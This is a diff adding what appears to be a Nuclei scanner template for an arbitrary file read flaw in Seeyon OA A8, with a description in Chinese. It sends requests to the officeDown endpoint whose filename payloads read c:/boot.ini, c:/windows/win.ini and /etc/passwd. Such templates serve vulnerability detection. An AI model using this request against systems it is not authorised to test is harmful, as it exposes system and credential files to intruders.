@@ -1,0 +1,28 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 200
+          type: dsl
+        - part: header
+          type: word
+          words:
+            - attachment;filename=
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/seeyon/main.do?method=officeDown&filename={{filepath}}'
+      payloads:
+        filepath:
+            - c:/boot.ini
+            - c:/windows/win.ini
+            - /etc/passwd
+      stop-at-first-match: true
+id: seeyon-oa-a8-main-do-fileread
+info:
+    author: pphua
+    description: 任意文件读取漏洞,由于对 filename 未进行过滤，导致可下载读取任意文件.
+    name: 致远OA A8任意文件读取
+    severity: high
+    tags:
+        - fileread
+        - seeyon
